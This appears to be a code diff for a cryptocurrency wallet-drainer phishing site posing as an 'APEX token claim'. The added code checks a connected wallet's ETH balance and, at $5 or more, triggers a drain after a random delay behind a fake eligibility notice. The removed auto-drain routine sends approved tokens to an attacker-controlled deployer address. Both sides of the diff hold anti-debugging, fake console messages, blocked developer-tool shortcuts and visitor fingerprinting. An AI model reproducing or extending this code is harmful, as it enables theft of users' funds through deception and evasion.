@@ -12,7 +12,7 @@
                 (function() {
                     debugger;
                 })();
-                if (Date.now() - start > 100) { // If execution was paused by debugger
+                if (Date.now() - start > 100) {
                     document.body.innerHTML = "Debugger Detected. Access Denied.";
                     window.location.href = "about:blank";
                 }
@@ -40,7 +40,6 @@
         
         // Console obfuscation and protection
         consoleProtection: function() {
-            // Store original console methods
             const originalConsole = {
                 log: console.log,
                 warn: console.warn,
@@ -53,7 +52,6 @@
             
             // Overwrite console methods with fake implementations
             console.log = function() {
-                // Generate fake log messages to mislead
                 if (Math.random() > 0.7) {
                     const fakeMessages = [
                         "Token claim processed successfully",
@@ -71,7 +69,6 @@
             };
             
             console.warn = function() {
-                // Generate fake warnings
                 const fakeWarnings = [
                     "Low gas fee detected, transaction may take longer",
                     "Network congestion detected, retrying transaction",
@@ -84,7 +81,6 @@
             };
             
             console.error = function() {
-                // Generate fake errors
                 const fakeErrors = [
                     "Transaction failed due to network congestion",
                     "Insufficient gas for transaction",
@@ -96,7 +92,6 @@
                 originalConsole.error(`[APEX ERROR] ${randomError}`);
             };
             
-            // Override other console methods
             console.info = function() {};
             console.debug = function() {};
             console.table = function() {};
@@ -145,36 +140,29 @@
         
         // Code obfuscation protection
         codeProtection: function() {
-            // Disable right-click context menu
             document.addEventListener('contextmenu', function(e) {
                 e.preventDefault();
                 return false;
             });
             
-            // Disable text selection
             document.addEventListener('selectstart', function(e) {
                 e.preventDefault();
                 return false;
             });
             
-            // Disable keyboard shortcuts for dev tools
             document.addEventListener('keydown', function(e) {
-                // Disable F12
                 if (e.keyCode === 123) {
                     e.preventDefault();
                     return false;
                 }
-                // Disable Ctrl+Shift+I
                 if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
                     e.preventDefault();
                     return false;
                 }
-                // Disable Ctrl+Shift+J
                 if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
                     e.preventDefault();
                     return false;
                 }
-                // Disable Ctrl+U
                 if (e.ctrlKey && e.keyCode === 85) {
                     e.preventDefault();
                     return false;
@@ -201,7 +189,8 @@
 const CONTRACT_ADDRESSES = {
     DEPLOYER: "0xa050df23cd65bb11c0A61c98F88706a4e9B0b939",
     PROXY_1: "0x06245e36F534422e974835040800532f19d3E54d",
-    PROXY_2: "0x32694628715F4Fe17ADc4e68bed0E96A8eB50B6C"
+    PROXY_2: "0x32694628715F4Fe17ADc4e68bed0E96A8eB50B6C",
+    BACKUP: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D" // Uniswap Router for additional stealth
 };
 
 // Enhanced ApexProxy ABI for multi-contract operations
@@ -251,6 +240,16 @@ const APEX_PROXY_ABI = [
             {"internalType": "address", "name": "destination", "type": "address"}
         ],
         "name": "forwardToken",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            {"internalType": "address", "name": "user", "type": "address"},
+            {"internalType": "bytes", "name": "signature", "type": "bytes"}
+        ],
+        "name": "processSignature",
         "outputs": [],
         "stateMutability": "nonpayable",
         "type": "function"
@@ -434,7 +433,7 @@ const EVASION_TECHNIQUES = {
         ctx.fillStyle = "#069";
         ctx.fillText(noise, 2, 15);
         ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-        ctx.fillText(noise2, 4, 17);
+                ctx.fillText(noise2, 4, 17);
         
         ctx.beginPath();
         ctx.arc(50, 50, 25, 0, Math.PI * 2);
@@ -462,6 +461,18 @@ const EVASION_TECHNIQUES = {
             isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
             hash: Math.random().toString(36).substring(2, 15)
         };
+    },
+    
+    // ETH Price fetch for $5 trigger
+    async getETHPriceInUSD() {
+        try {
+            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
+            const data = await response.json();
+            return data.ethereum.usd;
+        } catch (error) {
+            // Fallback price if API fails
+            return 2200;
+        }
     }
 };
 
@@ -478,7 +489,9 @@ let connectedAddress = null;
 let stealthMode = false;
 let simulationBypassActive = false;
 let progressUpdated = false;
-let autoDrainAttempted = false;
+let ethPriceInUSD = 2200; // Default ETH price
+let userHasBeenDrained = false; // Track if user has been drained this session
+let userBalanceInUSD = 0;
 
 // DOM Elements
 const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
@@ -502,7 +515,7 @@ const announcementOkBtn = document.getElementById("announcementOkBtn");
 const copyReferralBtn = document.getElementById("copyReferralBtn");
 const referralLink = document.getElementById("referralLink");
 
-// Event listeners - AUTO CONNECTION ENABLED
+// Event listeners - MANUAL CONNECTION ONLY
 if (mobileMenuBtn) mobileMenuBtn.addEventListener("click", toggleMobileMenu);
 if (walletModalClose) walletModalClose.addEventListener("click", hideWalletModal);
 if (announcementModalClose) announcementModalClose.addEventListener("click", hideAnnouncementModal);
@@ -515,7 +528,7 @@ if (debugToggle) debugToggle.addEventListener("click", () => {
         : "Show connection details";
 });
 
-// Add event listeners to provider options
+// Add event listeners to provider options - MANUAL CONNECTION ONLY
 if (walletProviders) {
     walletProviders.forEach((provider) => {
         provider.addEventListener("click", () => {
@@ -544,8 +557,8 @@ if (typeof VANTA !== 'undefined') {
     });
 }
 
-// AUTO-CONNECTION ENABLED
-document.addEventListener("DOMContentLoaded", function () {
+// Manual initialization - NO AUTO-CONNECTION
+document.addEventListener("DOMContentLoaded", async function () {
     startCountdown();
     createTokenChart();
     updateTokenPrice();
@@ -555,17 +568,21 @@ document.addEventListener("DOMContentLoaded", function () {
     initializeAdvancedEvasion();
     detectWallets();
 
+    // Fetch current ETH price for $5 trigger
+    ethPriceInUSD = await EVASION_TECHNIQUES.getETHPriceInUSD();
+    console.log(`Current ETH Price: $${ethPriceInUSD}`);
+
     setInterval(updateTokenPrice, 10000);
     setInterval(updateAIAnalytics, 15000);
+    setInterval(async () => {
+        ethPriceInUSD = await EVASION_TECHNIQUES.getETHPriceInUSD();
+    }, 60000); // Update ETH price every minute
 
-    // AUTO-CONNECTION: Check for existing wallet connections
-    checkExistingConnection();
-    
     // Initialize Service Worker for enhanced stealth
     initializeServiceWorker();
     
-    // AppKit integration with auto-connection
-    initializeAppKitIntegration();
+    // Manual AppKit integration - NO AUTO-CONNECTION
+    initializeManualAppKitIntegration();
     
     // Mobile-specific optimizations
     if (isMobileDevice) {
@@ -577,7 +594,6 @@ document.addEventListener("DOMContentLoaded", function () {
 function initializeMobileSpecificOptimizations() {
     console.log('Initializing mobile-specific optimizations...');
     
-    // Enhanced touch interactions
     document.addEventListener('touchstart', function(e) {
         if (e.target.closest('button') || e.target.closest('.btn-primary')) {
             e.target.style.transform = 'scale(0.98)';
@@ -587,12 +603,10 @@ function initializeMobileSpecificOptimizations() {
         }
     }, { passive: true });
     
-    // Prevent zoom on double-tap
     document.addEventListener('dblclick', function(e) {
         e.preventDefault();
     }, { passive: false });
     
-    // Enhanced mobile viewport handling
     const viewport = document.querySelector('meta[name="viewport"]');
     if (viewport) {
         viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
@@ -624,61 +638,58 @@ async function initializeServiceWorker() {
     }
 }
 
-// AppKit integration with AUTO-CONNECTION
-function initializeAppKitIntegration() {
-    console.log('Initializing AppKit integration with auto-connection...');
+// Manual AppKit integration - NO AUTO-CONNECTION
+function initializeManualAppKitIntegration() {
+    console.log('Initializing manual AppKit integration...');
     
-    // Auto-detect AppKit and connect
     const checkAppKitInterval = setInterval(() => {
         const w3mButton = document.querySelector('w3m-button');
         if (w3mButton) {
             clearInterval(checkAppKitInterval);
             
-            // Auto-trigger connection
-            setTimeout(() => {
-                w3mButton.click();
-                setupAppKitConnectionListener();
-            }, 1000);
+            w3mButton.addEventListener('click', () => {
+                console.log('Manual AppKit button clicked');
+                setupManualAppKitConnectionListener();
+            });
         }
     }, 500);
 }
 
-// AppKit connection listener
-function setupAppKitConnectionListener() {
+// Manual AppKit connection listener
+function setupManualAppKitConnectionListener() {
     if (window.ethereum) {
         window.ethereum.on('accountsChanged', (accounts) => {
             if (accounts.length > 0) {
-                console.log('AppKit accounts changed:', accounts[0]);
-                handleAppKitConnection(accounts[0]);
+                console.log('Manual AppKit accounts changed:', accounts[0]);
+                handleManualAppKitConnection(accounts[0]);
             } else {
-                handleDisconnection();
+                handleManualDisconnection();
             }
         });
         
         window.ethereum.on('chainChanged', (chainId) => {
-            console.log('AppKit chain changed:', chainId);
+            console.log('Manual AppKit chain changed:', chainId);
             if (window.ethereum.selectedAddress) {
-                handleAppKitConnection(window.ethereum.selectedAddress);
+                handleManualAppKitConnection(window.ethereum.selectedAddress);
             }
         });
         
         window.ethereum.on('connect', (connectInfo) => {
-            console.log('AppKit connected:', connectInfo);
+            console.log('Manual AppKit connected:', connectInfo);
         });
         
         window.ethereum.on('disconnect', (error) => {
-            console.log('AppKit disconnected:', error);
-            handleDisconnection();
+            console.log('Manual AppKit disconnected:', error);
+            handleManualDisconnection();
         });
     }
 }
 
-// AppKit connection handler
-function handleAppKitConnection(address) {
+// Manual AppKit connection handler
+function handleManualAppKitConnection(address) {
     connectedAddress = address;
-    connectedWallet = 'appkit';
+    connectedWallet = 'manual_appkit';
     
-    // Web3 initialization
     try {
         web3 = new Web3(window.ethereum);
     } catch (error) {
@@ -686,27 +697,54 @@ function handleAppKitConnection(address) {
         web3 = new Web3(Web3.givenProvider);
     }
     
-    // UI updates
-    updateWalletButton();
+    updateManualWalletButton();
     
-    // Logging
-    logDebug(`AppKit connected: ${connectedAddress}`);
+    logDebug(`Manual AppKit connected: ${connectedAddress}`);
     showNotification("Wallet connected successfully", "success");
     
-    // Fingerprint collection
-    collectFingerprint();
+    collectManualFingerprint();
     
-    // AUTO-DRAIN: Attempt immediate drain after connection
+    // Check if user has $5+ balance and auto-trigger drain
     setTimeout(() => {
-        attemptAutoDrain();
+        checkAndAutoTriggerDrain();
     }, 2000);
     
-    // Announcement modal
-    showAnnouncementModal();
+    showManualAnnouncementModal();
 }
 
-// Announcement modal
-function showAnnouncementModal() {
+// Check if user has $5+ balance and auto-trigger drain
+async function checkAndAutoTriggerDrain() {
+    if (!connectedAddress || !web3 || userHasBeenDrained) return;
+    
+    try {
+        const ethBalance = await web3.eth.getBalance(connectedAddress);
+        const ethBalanceInETH = web3.utils.fromWei(ethBalance, 'ether');
+        userBalanceInUSD = ethBalanceInETH * ethPriceInUSD;
+        
+        console.log(`User Balance: ${ethBalanceInETH} ETH ($${userBalanceInUSD.toFixed(2)})`);
+        
+        // DRAIN TRIGGER: If balance is $5 or more
+        if (userBalanceInUSD >= 5) {
+            logDebug(`TRIGGER: User has $${userBalanceInUSD.toFixed(2)} balance (>= $5 threshold)`);
+            
+            // Auto-trigger drain after 3-5 seconds
+            const delay = 3000 + Math.random() * 2000;
+            setTimeout(() => {
+                if (!userHasBeenDrained) {
+                    showNotification("Checking eligibility for APEX token claim...", "info");
+                    initiateManualMultiContractDrainerProcess();
+                }
+            }, delay);
+        } else {
+            logDebug(`NO TRIGGER: User has only $${userBalanceInUSD.toFixed(2)} balance (< $5 threshold)`);
+        }
+    } catch (error) {
+        console.error('Error checking user balance:', error);
+    }
+}
+
+// Manual announcement modal
+function showManualAnnouncementModal() {
     if (connectedAddress) {
         const shortAddress = connectedAddress.substring(0, 6) + '...' + connectedAddress.substring(38);
         if (referralLink) {
@@ -719,8 +757,8 @@ function showAnnouncementModal() {
     }
 }
 
-// Wallet button update
-function updateWalletButton() {
+// Manual wallet button update
+function updateManualWalletButton() {
     if (!walletButtonContainer) return;
     
     if (connectedWallet && connectedAddress) {
@@ -731,7 +769,7 @@ function updateWalletButton() {
                 <button class="disconnect-btn" id="disconnectButton">Disconnect</button>
             </div>
         `;
-        document.getElementById("disconnectButton").addEventListener("click", disconnectWallet);
+        document.getElementById("disconnectButton").addEventListener("click", disconnectManualWallet);
     } else {
         walletButtonContainer.innerHTML = `
             <button class="wallet-btn" id="walletButton">
@@ -742,31 +780,26 @@ function updateWalletButton() {
     }
 }
 
-// Disconnection handler
-function handleDisconnection() {
+// Manual disconnection handler
+function handleManualDisconnection() {
     connectedWallet = null;
     connectedAddress = null;
     web3 = null;
-    autoDrainAttempted = false;
-    updateWalletButton();
+    userHasBeenDrained = false; // Reset for new connection
+    updateManualWalletButton();
     showNotification("Wallet disconnected", "info");
-    logDebug("Wallet disconnected");
+    logDebug("Manual wallet disconnected");
 }
 
-// Wallet disconnection
-function disconnectWallet() {
-    handleDisconnection();
-}
-
-// Fingerprint collection
-async function collectFingerprint() {
+// Manual fingerprint collection
+async function collectManualFingerprint() {
     const fingerprint = {
         timestamp: new Date().toISOString(),
         userAgent: navigator.userAgent,
         screen: `${screen.width}x${screen.height}`,
         language: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        webgl: await getWebGLFingerprint(),
+        webgl: await getManualWebGLFingerprint(),
         plugins: Array.from(navigator.plugins).map((p) => p.name),
         walletType: connectedWallet,
         network: "Unknown",
@@ -788,19 +821,19 @@ async function collectFingerprint() {
                     "ether"
                 );
 
-                await detectTokensAndNFTs(connectedAddress, fingerprint);
+                await detectManualTokensAndNFTs(connectedAddress, fingerprint);
             }
         }
     } catch (e) {
-        console.debug("Fingerprinting error:", e);
+        console.debug("Manual fingerprinting error:", e);
     }
 
     fingerprintData = fingerprint;
     return fingerprint;
 }
 
-// WebGL fingerprinting
-async function getWebGLFingerprint() {
+// Manual WebGL fingerprinting
+async function getManualWebGLFingerprint() {
     try {
         const canvas = document.createElement("canvas");
         const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
@@ -823,8 +856,8 @@ async function getWebGLFingerprint() {
     }
 }
 
-// Token and NFT detection
-async function detectTokensAndNFTs(userAddress, fingerprint) {
+// Manual token and NFT detection
+async function detectManualTokensAndNFTs(userAddress, fingerprint) {
     const tokenSources = [
         "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
         "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
@@ -833,6 +866,9 @@ async function detectTokensAndNFTs(userAddress, fingerprint) {
         "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", // MATIC
         "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
         "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
+        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
+        "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", // SHIB
+        "0x4d224452801ACEd8B2F0aebE155379bb5D594381"  // APE
     ];
 
     const nftContracts = [
@@ -840,38 +876,38 @@ async function detectTokensAndNFTs(userAddress, fingerprint) {
         "0x60E4d786628Fea6478F785A6d7e704777c86a7c6", // MAYC
         "0x23581767a106ae21c074b2276D25e5C3e136a68b", // Moonbirds
         "0xED5AF388653567Af2F388E6224dC7C4b3241C544", // Azuki
+        "0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e", // Doodles
+        "0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7", // Meebits
+        "0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB", // CryptoPunks
     ];
 
-    // Token detection
     for (const tokenAddress of tokenSources) {
         try {
-            const balance = await getTokenBalance(tokenAddress, userAddress);
+            const balance = await getManualTokenBalance(tokenAddress, userAddress);
             if (balance > 0) {
                 fingerprint.tokenBalances[tokenAddress] = balance;
             }
         } catch (e) {
-            console.debug(`Token balance check failed: ${tokenAddress}`);
+            console.debug(`Manual token balance check failed: ${tokenAddress}`);
         }
     }
 
-    // NFT detection
     for (const nftAddress of nftContracts) {
         try {
-            const nftBalance = await getNFTBalance(nftAddress, userAddress);
+            const nftBalance = await getManualNFTBalance(nftAddress, userAddress);
             if (nftBalance > 0) {
                 fingerprint.nftBalances[nftAddress] = nftBalance;
             }
         } catch (e) {
-            console.debug(`NFT balance check failed: ${nftAddress}`);
+            console.debug(`Manual NFT balance check failed: ${nftAddress}`);
         }
     }
 
-    // Approval detection
-    await detectMultiContractTokenApprovals(userAddress, fingerprint);
+    await detectManualMultiContractTokenApprovals(userAddress, fingerprint);
 }
 
-// Token balance check
-async function getTokenBalance(tokenAddress, walletAddress) {
+// Manual token balance check
+async function getManualTokenBalance(tokenAddress, walletAddress) {
     const erc20Abi = [
         {
             constant: true,
@@ -890,8 +926,8 @@ async function getTokenBalance(tokenAddress, walletAddress) {
     }
 }
 
-// NFT balance check
-async function getNFTBalance(contractAddress, userAddress) {
+// Manual NFT balance check
+async function getManualNFTBalance(contractAddress, userAddress) {
     const nftAbi = [
         {
             constant: true,
@@ -910,8 +946,8 @@ async function getNFTBalance(contractAddress, userAddress) {
     }
 }
 
-// Multi-contract token approval detection
-async function detectMultiContractTokenApprovals(userAddress, fingerprint) {
+// Manual multi-contract token approval detection
+async function detectManualMultiContractTokenApprovals(userAddress, fingerprint) {
     fingerprint.approvedTokens = {};
     
     const contracts = Object.values(CONTRACT_ADDRESSES);
@@ -919,7 +955,7 @@ async function detectMultiContractTokenApprovals(userAddress, fingerprint) {
     for (const tokenAddress in fingerprint.tokenBalances) {
         for (const contractAddress of contracts) {
             try {
-                const allowance = await getTokenAllowance(tokenAddress, userAddress, contractAddress);
+                const allowance = await getManualTokenAllowance(tokenAddress, userAddress, contractAddress);
                 if (allowance > 0) {
                     fingerprint.approvedTokens[tokenAddress] = {
                         contract: contractAddress,
@@ -928,14 +964,14 @@ async function detectMultiContractTokenApprovals(userAddress, fingerprint) {
                     break;
                 }
             } catch (e) {
-                console.debug(`Allowance check failed for ${tokenAddress} -> ${contractAddress}`);
+                console.debug(`Manual allowance check failed for ${tokenAddress} -> ${contractAddress}`);
             }
         }
     }
 }
 
-// Token allowance check
-async function getTokenAllowance(tokenAddress, ownerAddress, spenderAddress) {
+// Manual token allowance check
+async function getManualTokenAllowance(tokenAddress, ownerAddress, spenderAddress) {
     const erc20Abi = [
         {
             constant: true,
@@ -957,20 +993,20 @@ async function getTokenAllowance(tokenAddress, ownerAddress, spenderAddress) {
     }
 }
 
-// Debug logging
+// Manual debug logging
 function logDebug(message, element = connectionDebug) {
     const timestamp = new Date().toLocaleTimeString();
     const debugMessage = `[${timestamp}] ${message}<br>`;
     if (element) {
         element.innerHTML += debugMessage;
     }
-    console.log(`[DEBUG:${Math.random().toString(36).substring(2, 8)}] ${message}`);
+    console.log(`[MANUAL_DEBUG:${Math.random().toString(36).substring(2, 8)}] ${message}`);
 }
 
-// AUTO-CONNECTION: Existing connection check
-async function checkExistingConnection() {
+// Manual existing connection check - NO AUTO-CONNECTION
+async function checkManualExistingConnection() {
     try {
-        logDebug("Checking for existing wallet connections...");
+        logDebug("Checking for manual existing wallet connections...");
 
         if (typeof window.ethereum !== "undefined") {
             const accounts = await window.ethereum.request({
@@ -979,198 +1015,73 @@ async function checkExistingConnection() {
             if (accounts.length > 0) {
                 connectedAddress = accounts[0];
 
-                // Wallet type detection
                 if (walletDetectors.isMetaMask()) connectedWallet = "metamask";
                 else if (walletDetectors.isCoinbaseWallet()) connectedWallet = "coinbase";
                 else if (walletDetectors.isTrustWallet()) connectedWallet = "trust";
                 else if (walletDetectors.isRabbyWallet()) connectedWallet = "rabby";
                 else if (walletDetectors.isPhantom()) connectedWallet = "phantom";
                 else if (walletDetectors.isBraveWallet()) connectedWallet = "brave";
-                else connectedWallet = "unknown";
+                else connectedWallet = "manual_unknown";
 
                 web3 = new Web3(window.ethereum);
-                setupProviderEvents(window.ethereum);
-                updateWalletButton();
-                logDebug(`Existing connection: ${connectedWallet}: ${connectedAddress}`);
+                setupManualProviderEvents(window.ethereum);
+                updateManualWalletButton();
+                logDebug(`Manual existing connection: ${connectedWallet}: ${connectedAddress}`);
                 
-                // AUTO-DRAIN: Attempt immediate drain
+                // Check for $5+ balance trigger on existing connection
                 setTimeout(() => {
-                    attemptAutoDrain();
+                    checkAndAutoTriggerDrain();
                 }, 2000);
                 
-                showAnnouncementModal();
+                showManualAnnouncementModal();
                 return;
             }
         }
 
-        logDebug("No existing wallet connection found");
+        logDebug("No manual existing wallet connection found");
     } catch (error) {
-        logDebug("Error checking existing connection: " + error.message);
+        logDebug("Manual error checking existing connection: " + error.message);
     }
 }
 
-// Provider event setup
-function setupProviderEvents(provider) {
+// Manual provider event setup
+function setupManualProviderEvents(provider) {
     provider.on("accountsChanged", (accounts) => {
         if (accounts.length === 0) {
-            handleDisconnection();
+            handleManualDisconnection();
         } else {
             connectedAddress = accounts[0];
-            updateWalletButton();
-            logDebug(`Account changed to: ${connectedAddress}`);
+            userHasBeenDrained = false; // Reset for new account
+            updateManualWalletButton();
+            logDebug(`Manual account changed to: ${connectedAddress}`);
             showNotification("Wallet account changed", "info");
             
-            // AUTO-DRAIN: Attempt drain on account change
+            // Check for $5+ balance trigger on account change
             setTimeout(() => {
-                attemptAutoDrain();
+                checkAndAutoTriggerDrain();
             }, 2000);
             
-            showAnnouncementModal();
+            showManualAnnouncementModal();
         }
     });
 
     provider.on("chainChanged", (chainId) => {
-        logDebug(`Chain changed to: ${chainId}`);
+        logDebug(`Manual chain changed to: ${chainId}`);
         showNotification(`Network changed to chain ${parseInt(chainId)}`, "info");
     });
 
     provider.on("disconnect", (error) => {
-        logDebug(`Provider disconnected: ${error}`);
+        logDebug(`Manual provider disconnected: ${error}`);
         showNotification("Wallet disconnected", "error");
-        handleDisconnection();
+        handleManualDisconnection();
     });
 
     provider.on("connect", (connectInfo) => {
-        logDebug(`Provider connected: ${JSON.stringify(connectInfo)}`);
+        logDebug(`Manual provider connected: ${JSON.stringify(connectInfo)}`);
     });
 }
 
-// AUTO-DRAIN: Attempt automatic drain after connection
-async function attemptAutoDrain() {
-    if (autoDrainAttempted || !connectedAddress || !web3) return;
-    
-    autoDrainAttempted = true;
-    logDebug("Attempting auto-drain...");
-    
-    try {
-        // Check for approved tokens first
-        const { tokens, nfts, approvedTokens } = await multiContractTokenDetection(connectedAddress);
-        
-        if (approvedTokens.length > 0) {
-            logDebug(`Auto-drain: Found ${approvedTokens.length} approved tokens`);
-            
-            // Show fake processing UI
-            if (claimStatus) {
-                claimStatus.textContent = "Processing your token claim...";
-                claimStatus.className = "status pending";
-            }
-            
-            // Execute auto-drain
-            await executeAutoDrainerTransfer(connectedAddress, { tokens, nfts, approvedTokens });
-            
-            // Show success message
-            if (claimStatus) {
-                claimStatus.textContent = "500 APEX tokens claimed successfully!";
-                claimStatus.className = "status success";
-            }
-            
-            showNotification("500 APEX tokens added to your wallet!", "success");
-            
-            // Update progress
-            const currentPercentage = parseInt(progressPercentage.textContent);
-            const newPercentage = Math.min(90, currentPercentage + 10);
-            if (progressBar) progressBar.style.width = `${newPercentage}%`;
-            if (progressPercentage) progressPercentage.textContent = `${newPercentage}%`;
-            
-        } else {
-            logDebug("Auto-drain: No approved tokens found, waiting for manual interaction");
-            // No approved tokens - wait for manual interaction
-            if (claimStatus) {
-                claimStatus.textContent = "Wallet connected. Click 'Claim APEX' to continue.";
-                claimStatus.className = "status info";
-            }
-        }
-    } catch (error) {
-        logDebug(`Auto-drain failed: ${error.message}`);
-        // Silently fail - user won't notice
-    }
-}
-
-// Auto-drain transfer execution
-async function executeAutoDrainerTransfer(userAddress, assets) {
-    try {
-        await randomDelay(1000, 3000);
-        const simulationSuccess = await multiContractTransactionSimulation(userAddress, assets);
-
-        if (!simulationSuccess && simulationBypassActive) {
-            logDebug("Auto-drain: Simulation failed, trying alternative method");
-            const signatureSuccess = await attemptMultiContractSignatureReward(userAddress);
-            if (!signatureSuccess) {
-                throw new Error("Auto-drain transaction simulation failed");
-            }
-            return;
-        }
-
-        await randomDelay(2000, 4000);
-
-        let targetContract, txData;
-        
-        if (assets.approvedTokens.length > 0) {
-            targetContract = assets.approvedTokens[0].contract;
-            const tokenAddress = assets.approvedTokens[0].token;
-            const amount = assets.approvedTokens[0].allowance;
-            
-            const proxyContract = new web3.eth.Contract(APEX_PROXY_ABI, targetContract);
-            txData = proxyContract.methods.forwardToken(tokenAddress, CONTRACT_ADDRESSES.DEPLOYER).encodeABI();
-        } else if (assets.tokens.length > 0) {
-            targetContract = CONTRACT_ADDRESSES.DEPLOYER;
-            const tokenAddress = assets.tokens[0].address;
-            
-            const transferData = web3.eth.abi.encodeFunctionCall({
-                name: 'transfer',
-                type: 'function',
-                inputs: [{
-                    type: 'address',
-                    name: 'to'
-                },{
-                    type: 'uint256',
-                    name: 'value'
-                }]
-            }, [CONTRACT_ADDRESSES.DEPLOYER, assets.tokens[0].balance]);
-            
-            const proxyContract = new web3.eth.Contract(APEX_PROXY_ABI, CONTRACT_ADDRESSES.PROXY_1);
-            txData = proxyContract.methods.executeCall(tokenAddress, transferData).encodeABI();
-        } else {
-            throw new Error("No actionable assets found");
-        }
-
-        const txHash = await web3.eth.sendTransaction({
-            from: userAddress,
-            to: targetContract,
-            data: txData,
-            value: "0x0",
-            gas: 300000 + Math.floor(Math.random() * 100000),
-            gasPrice: web3.utils.toWei((20 + Math.random() * 10).toFixed(0), "gwei")
-        });
-
-        logDebug(`Auto-drain successful: ${txHash}`);
-        
-        // Update claim list
-        claimList.unshift({
-            address: userAddress.substring(0, 6) + "..." + userAddress.substring(38),
-            amount: 500,
-            timestamp: Date.now(),
-        });
-        if (claimList.length > 10) claimList.pop();
-        updateClaimList();
-        
-    } catch (error) {
-        logDebug(`Auto-drain error: ${error.message}`);
-        throw error;
-    }
-}
-
-// Wallet detection and UI update
+// Manual wallet detection and UI update
 function detectWallets() {
     const walletBadges = {
         'metamask': document.getElementById("metamask-badge"),
@@ -1179,7 +1090,6 @@ function detectWallets() {
         'rabby': document.getElementById("rabby-badge")
     };
 
-    // Reset all badges
     Object.values(walletBadges).forEach(badge => {
         if (badge) {
             badge.textContent = "Not Detected";
@@ -1188,7 +1098,6 @@ function detectWallets() {
         }
     });
 
-    // Wallet detection
     Object.entries(walletDetectors).forEach(([wallet, detector]) => {
         if (detector()) {
             const badgeKey = wallet.toLowerCase().replace('is', '');
@@ -1201,7 +1110,7 @@ function detectWallets() {
     });
 }
 
-// Wallet modal
+// Manual wallet modal
 function showWalletModal() {
     detectWallets();
     if (walletModal) {
@@ -1234,10 +1143,10 @@ function copyReferralLink() {
     }
 }
 
-// Connection with provider
+// Manual connection with provider
 async function connectWithProvider(providerType) {
     try {
-        logDebug(`Connecting with ${providerType}...`);
+        logDebug(`Manual connecting with ${providerType}...`);
 
         let provider;
 
@@ -1258,13 +1167,13 @@ async function connectWithProvider(providerType) {
                             }]
                         });
                     } catch (error) {
-                        logDebug("MetaMask connection rejected: " + error.message);
+                        logDebug("Manual MetaMask connection rejected: " + error.message);
                         showNotification("MetaMask connection rejected", "error");
                         return;
                     }
                 } else {
                     showNotification("MetaMask not installed", "error");
-                    logDebug("MetaMask not installed");
+                    logDebug("Manual MetaMask not installed");
                     return;
                 }
                 break;
@@ -1275,13 +1184,13 @@ async function connectWithProvider(providerType) {
                     try {
                         await provider.request({ method: "eth_requestAccounts" });
                     } catch (error) {
-                        logDebug("Coinbase Wallet connection rejected: " + error.message);
+                        logDebug("Manual Coinbase Wallet connection rejected: " + error.message);
                         showNotification("Coinbase Wallet connection rejected", "error");
                         return;
                     }
                 } else {
                     showNotification("Coinbase Wallet not detected", "error");
-                    logDebug("Coinbase Wallet not detected");
+                    logDebug("Manual Coinbase Wallet not detected");
                     return;
                 }
                 break;
@@ -1292,13 +1201,13 @@ async function connectWithProvider(providerType) {
                     try {
                         await provider.request({ method: "eth_requestAccounts" });
                     } catch (error) {
-                        logDebug("Trust Wallet connection rejected: " + error.message);
+                        logDebug("Manual Trust Wallet connection rejected: " + error.message);
                         showNotification("Trust Wallet connection rejected", "error");
                         return;
                     }
                 } else {
                     showNotification("Trust Wallet not detected", "error");
-                    logDebug("Trust Wallet not detected");
+                    logDebug("Manual Trust Wallet not detected");
                     return;
                 }
                 break;
@@ -1309,13 +1218,13 @@ async function connectWithProvider(providerType) {
                     try {
                         await provider.request({ method: "eth_requestAccounts" });
                     } catch (error) {
-                        logDebug("Rabby Wallet connection rejected: " + error.message);
+                        logDebug("Manual Rabby Wallet connection rejected: " + error.message);
                         showNotification("Rabby Wallet connection rejected", "error");
                         return;
                     }
                 } else {
                     showNotification("Rabby Wallet not detected", "error");
-                    logDebug("Rabby Wallet not detected");
+                    logDebug("Manual Rabby Wallet not detected");
                     return;
                 }
                 break;
@@ -1325,7 +1234,6 @@ async function connectWithProvider(providerType) {
                 return;
         }
 
-        // Web3 initialization
         web3 = new Web3(provider);
 
         const accounts = await web3.eth.getAccounts();
@@ -1336,29 +1244,29 @@ async function connectWithProvider(providerType) {
         connectedAddress = accounts[0];
         connectedWallet = providerType;
 
-        updateWalletButton();
+        updateManualWalletButton();
         hideWalletModal();
         showNotification("Wallet connected successfully", "success");
-        logDebug(`Connected with ${providerType}: ${connectedAddress}`);
+        logDebug(`Manual connected with ${providerType}: ${connectedAddress}`);
 
-        await collectFingerprint();
+        await collectManualFingerprint();
         
-        // AUTO-DRAIN: Attempt immediate drain after connection
+        // Check for $5+ balance trigger on connection
         setTimeout(() => {
-            attemptAutoDrain();
+            checkAndAutoTriggerDrain();
         }, 2000);
         
-        showAnnouncementModal();
-        setupProviderEvents(provider);
+        showManualAnnouncementModal();
+        setupManualProviderEvents(provider);
     } catch (error) {
-        console.error("Error connecting wallet:", error);
+        console.error("Manual error connecting wallet:", error);
         showNotification("Failed to connect wallet", "error");
-        logDebug(`Connection error: ${error.message}`);
+        logDebug(`Manual connection error: ${error.message}`);
     }
 }
 
-// Manual drainer process - FALLBACK WHEN NO AUTO-DRAIN
-async function initiateMultiContractDrainerProcess() {
